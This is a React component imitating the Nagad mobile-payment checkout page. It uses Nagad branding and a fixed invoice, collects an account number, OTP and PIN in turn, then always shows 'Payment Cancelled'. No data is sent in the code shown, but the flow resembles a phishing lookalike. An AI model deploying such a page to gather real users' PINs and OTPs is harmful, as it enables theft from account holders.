import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { XCircle } from "lucide-react";
import nagadLogoImg from "@/assets/nagad-logo.png";
import cartIcon from "@/assets/cart-icon.png";

const NagadPayment = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(true);
  const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
  const [showOtpView, setShowOtpView] = useState(false);
  const [showPinView, setShowPinView] = useState(false);
  const [showFailedView, setShowFailedView] = useState(false);
  const [otpValue, setOtpValue] = useState("");
  const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [language, setLanguage] = useState<'bn' | 'en'>('en');

  const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpInputRef = useRef<HTMLInputElement | null>(null);
  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const timer = setTimeout(() => setIsLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (!isLoading && !showFailedView) {
      if (showPinView) {
        pinInputRefs.current[0]?.focus();
      } else if (showOtpView) {
        otpInputRef.current?.focus();
      } else {
        phoneInputRefs.current[0]?.focus();
      }
    }
  }, [isLoading, showOtpView, showPinView, showFailedView]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const getPhoneNumber = () => phoneDigits.join("");

  const isValidNumber = () => {
    const phone = getPhoneNumber();
    if (phone.length !== 11) return false;
    return validPrefixes.includes(phone.substring(0, 3)) && /^\d+$/.test(phone);
  };

  const isValidOtp = () => otpValue.length === 6 && /^\d+$/.test(otpValue);
  const isValidPin = () => pinDigits.every(d => d !== "") && pinDigits.join("").length === 4;

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showFailedView && redirectTimer > 0) {
      interval = setInterval(() => setRedirectTimer((prev) => prev - 1), 1000);
    }
    if (showFailedView && redirectTimer === 0) navigate("/");
    return () => clearInterval(interval);
  }, [showFailedView, redirectTimer, navigate]);

  const handleDigitChange = (
    index: number, value: string, digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>, maxLength: number
  ) => {
    if (!/^\d*$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);
    if (value && index < maxLength - 1) refs.current[index + 1]?.focus();
  };

  const handleKeyDown = (
    index: number, e: React.KeyboardEvent<HTMLInputElement>,
    digits: string[], setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) refs.current[index - 1]?.focus();
  };

  const handleConfirm = () => {
    if (isValidNumber()) {
      setShowOtpView(true);
    }
  };

  const handleOtpConfirm = () => {
    if (isValidOtp()) {
      setShowOtpView(false);
      setShowPinView(true);
    }
  };

  const handlePinConfirm = () => {
    if (isValidPin()) {
      setShowPinView(false);
      setShowFailedView(true);
      setRedirectTimer(5);
    }
  };

  const handleClose = () => navigate("/");

  const renderPhoneInputs = () => {
    const groups = [3, 4, 4];
    let currentIndex = 0;
    const elements: JSX.Element[] = [];

    groups.forEach((groupSize, groupIndex) => {
      const inputs: JSX.Element[] = [];
      for (let i = 0; i < groupSize; i++) {
        const index = currentIndex + i;
        inputs.push(
          <input
            key={index}
            ref={(el) => (phoneInputRefs.current[index] = el)}
            type="tel"
            inputMode="numeric"
            maxLength={1}
            value={phoneDigits[index] || ""}
            onChange={(e) => handleDigitChange(index, e.target.value, phoneDigits, setPhoneDigits, phoneInputRefs, 11)}
            onKeyDown={(e) => handleKeyDown(index, e, phoneDigits, setPhoneDigits, phoneInputRefs)}
            className="w-9 h-11 bg-white rounded text-center text-gray-800 text-lg font-medium focus:outline-none focus:ring-2 focus:ring-white/50"
          />
        );
      }
      elements.push(<div key={groupIndex} className="flex gap-1">{inputs}</div>);
      currentIndex += groupSize;
      if (groupIndex < groups.length - 1) {
        elements.push(<span key={`sep-${groupIndex}`} className="text-white text-xl font-bold mx-1">-</span>);
      }
    });

    return <div className="flex items-center justify-center">{elements}</div>;
  };

  const renderPinInputs = () => (
    <div className="flex items-center justify-center gap-3">
      {pinDigits.map((digit, index) => (
        <input
          key={index}
          ref={(el) => (pinInputRefs.current[index] = el)}
          type="password"
          inputMode="numeric"
          maxLength={1}
          value={digit}
          onChange={(e) => handleDigitChange(index, e.target.value, pinDigits, setPinDigits, pinInputRefs, 4)}
          onKeyDown={(e) => handleKeyDown(index, e, pinDigits, setPinDigits, pinInputRefs)}
          className="w-14 h-14 bg-white rounded-lg text-center text-gray-800 text-2xl font-medium focus:outline-none focus:ring-2 focus:ring-white/50"
        />
      ))}
    </div>
  );

  return (
    <div className="min-h-screen bg-gray-200 flex flex-col items-center p-4">
      <div className="w-full max-w-md overflow-hidden flex flex-col" style={{ height: '85vh' }}>
        {isLoading ? (
          <div
            className="flex-1 flex flex-col items-center justify-center rounded-lg"
            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}
          >
            <p className="text-white text-sm font-medium">Loading...</p>
          </div>
        ) : showFailedView ? (
          <div
            className="flex-1 flex flex-col items-center justify-center rounded-lg"
            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}
          >
            <XCircle className="w-12 h-12 text-white mb-4" strokeWidth={1.5} />
            <h3 className="text-white text-center text-lg font-medium mb-2">Payment Cancelled</h3>
            <p className="text-white text-center text-sm">Redirecting to Merchant Website in {redirectTimer}s</p>
          </div>
        ) : (
          <div
            className="flex-1 flex flex-col rounded-lg overflow-hidden"
            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}
          >
            {/* Language Toggle */}
            <div className="flex justify-end p-3">
              <div className="flex rounded overflow-hidden border border-white/30">
                <button
                  onClick={() => setLanguage('bn')}
                  className={`px-3 py-1 text-xs font-medium transition-colors ${language === 'bn' ? 'bg-white/20 text-white' : 'text-white/70'}`}
                >বাং</button>
                <button
                  onClick={() => setLanguage('en')}
                  className={`px-3 py-1 text-xs font-medium transition-colors ${language === 'en' ? 'bg-white/20 text-white' : 'text-white/70'}`}
                >Eng</button>
              </div>
            </div>

            {/* Cart Icon & Title */}
            <div className="flex flex-col items-center pt-2 pb-4">
              <img src={cartIcon} alt="Cart" className="w-20 h-20 mb-3 object-contain" />
              <h1 className="text-white text-xl font-semibold">Easy Payment System</h1>
            </div>

            {/* Invoice Details */}
            <div className="px-6 py-4 space-y-2">
              <div className="flex">
                <span className="text-white font-semibold w-32">Invoice No:</span>
                <span className="text-white/80">B255527202718B</span>
              </div>
              <div className="flex">
                <span className="text-white font-semibold w-32">Total Amount:</span>
                <span className="text-white/80">BDT 434</span>
              </div>
              <div className="flex">
                <span className="text-white font-semibold w-32">Charge:</span>
                <span className="text-white/80">BDT 0</span>
              </div>
            </div>

            <div className="flex-1" />

            {/* Input Section */}
            <div className="px-6 pb-4">
              {showPinView ? (
                <div className="h-32 flex flex-col justify-center">
                  <p className="text-white text-center text-base font-medium mb-5 h-5">Enter PIN</p>
                  {renderPinInputs()}
                </div>
              ) : showOtpView ? (
                <div className="h-32 flex flex-col justify-center">
                  <p className="text-white text-center text-base font-medium mb-5 h-5">Enter Verification Code [OTP]</p>
                  <input
                    ref={otpInputRef}
                    type="tel"
                    inputMode="numeric"
                    maxLength={6}
                    value={otpValue}
                    onChange={(e) => {
                      const v = e.target.value.replace(/\D/g, '').slice(0, 6);
                      setOtpValue(v);
                    }}
                    placeholder="XXX|XXX"
                    className="w-full h-12 bg-white rounded-lg text-center text-gray-800 text-lg font-medium focus:outline-none focus:ring-2 focus:ring-white/50 placeholder:text-gray-400"
                  />
                </div>
              ) : (
                <div className="h-32 flex flex-col justify-center">
                  <p className="text-white text-center text-base font-semibold mb-5 h-5">Your Nagad Account Number</p>
                  {renderPhoneInputs()}
                </div>
              )}
            </div>

            {/* Terms - only on phone view */}
            <div className="px-6 py-2 h-12 flex items-center justify-center">
              {!showOtpView && !showPinView && (
                <p className="text-white/80 text-center text-xs">
                  By clicking/tapping "Proceed" you are agreeing to our{" "}
                  <span className="text-white font-medium underline">Terms and Conditions</span>
                </p>
              )}
            </div>

            {/* Action Buttons */}
            <div className="px-6 py-4 flex gap-4">
              <button
                onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
                disabled={showPinView ? !isValidPin() : showOtpView ? !isValidOtp() : !isValidNumber()}
                className={`flex-1 bg-white text-[#C41E3A] py-3 rounded-lg text-sm font-semibold transition-colors ${
                  (showPinView ? isValidPin() : showOtpView ? isValidOtp() : isValidNumber())
                    ? 'hover:bg-white/90' : 'opacity-50 cursor-not-allowed'
                }`}
              >
                Proceed
              </button>
              {showOtpView && (
                <button
                  onClick={() => setOtpValue("")}
                  className="flex-1 bg-white text-[#C41E3A] py-3 rounded-lg text-sm font-semibold hover:bg-white/90 transition-colors"
                >
                  Resend Code
                </button>
              )}
              <button
                onClick={handleClose}
                className="flex-1 bg-white text-[#C41E3A] py-3 rounded-lg text-sm font-semibold hover:bg-white/90 transition-colors"
              >
                Close
              </button>
            </div>

            {/* Nagad Logo Footer */}
            <div className="flex justify-center py-6">
              <img src={nagadLogoImg} alt="Nagad" className="h-12 object-contain" />
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default NagadPayment;
